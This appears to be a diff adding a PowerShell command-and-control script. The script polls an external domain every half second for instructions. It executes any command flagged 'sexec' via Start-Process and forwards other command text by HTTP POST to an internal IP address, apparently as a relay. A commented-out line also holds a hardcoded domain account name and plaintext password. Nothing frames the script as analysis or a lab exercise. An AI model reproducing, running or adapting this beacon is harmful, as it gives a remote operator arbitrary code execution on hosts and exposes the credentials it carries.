@@ -1,0 +1,56 @@
+$client = (New-Object Net.WebClient)
+
+while(1)
+    {
+        start-sleep -m 500
+
+        Try
+            {
+                #(cmd.exe /c del C:\Users\Public\commands.txt); -ErrorAction Stop
+                $comma = $client.DownloadString("https://1-33-7.com/comma"); #-ErrorAction Stop
+                $cmd = $comma -split "}{}{}{"
+                if($cmd[0] -eq "sexec")
+                    {
+                        Start-Process $cmd[1]
+                        Continue 
+                    }
+               
+            }
+        Catch
+            {
+                write-host "None"
+                $action = 0
+                Continue
+            }
+       $fil = [io.file]::readalltext("c:\\users\public\\old.txt")
+       if ($comma -ne "AAA`n")
+       {
+           if($comma -ne $fil)
+                {
+           
+                    #$creds = New-Object System.Management.Automation.PSCredential("analyst-dom\otzar",(ConvertTo-SecureString "Analyst2017!" -AsPlainText -Force))
+                    $boundary = [System.Guid]::NewGuid().ToString()
+                    $LF = "`r`n"
+                    $body = (
+                             "----------$boundary",
+                             "Content-Disposition: form-data; name=`"file`"; filename=`"commands.txt`"",
+                             "$LF$comma",
+                             "----------$boundary--$LF"
+                            ) -join $LF
+
+                    write-host $body
+                    start-sleep -m 500
+                    Invoke-RestMethod -Uri "http://172.16.100.140/" -Method Post -ContentType "multipart/form-data; boundary=----------$boundary" -Body $body 
+                    [io.file]::writealltext("c:\\users\\public\\old.txt",$comma)
+                }
+            else
+                {
+                    Continue
+                }
+        }
+        else
+            {
+                Continue
+            }
+
+    }
